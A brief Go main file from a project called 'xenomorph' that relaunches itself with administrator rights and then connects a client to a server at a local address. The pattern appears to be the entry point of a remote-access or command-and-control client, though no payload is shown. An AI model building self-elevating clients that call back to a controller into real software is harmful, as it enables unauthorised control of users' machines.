package main

import (
	"fmt"

	client "github.com/codevault-llc/xenomorph/internal/netclient"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/utils"
	"go.uber.org/zap"
)

func main() {
	err := logger.InitClientLogger("development")
	if err != nil {
		panic(fmt.Sprintf("Failed to initialize logger: %v", err))
	}

	utils.RerunAsAdmin()

	netclient := client.NewClient("127.0.0.1:8080")
	if err := netclient.Run(); err != nil {
		logger.L().Error("Failed to connect to server", zap.Error(err))
		return
	}
	defer netclient.Close()
}
